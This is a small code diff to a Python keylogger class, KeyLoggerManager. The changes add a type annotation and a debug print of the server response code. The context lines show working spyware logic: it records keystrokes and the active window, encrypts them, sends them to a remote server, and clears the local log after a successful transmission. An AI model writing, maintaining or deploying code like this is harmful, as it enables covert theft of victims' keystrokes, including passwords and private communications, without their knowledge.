@@ -46,7 +46,7 @@ class KeyLoggerManager:
                 active_app: str = self.get_active_window()
                 
                 # Retrieve recorded keystrokes
-                logged_keys = key_logger.get_logged_keys()
+                logged_keys: list[str] = key_logger.get_logged_keys()
 
                 # If no keystrokes, skip sending
                 if not logged_keys:
@@ -73,6 +73,7 @@ class KeyLoggerManager:
                 # Send data to the server
                 try:
                     status_code: int = NetworkWriter.send_data(encrypted_data)
+                    print(status_code)
                     key_logger.clear_log()  # Clear log after successful transmission
                 except Exception as e:
                     last_error: str = f"Failed to send data at {timestamp}: {str(e)}"
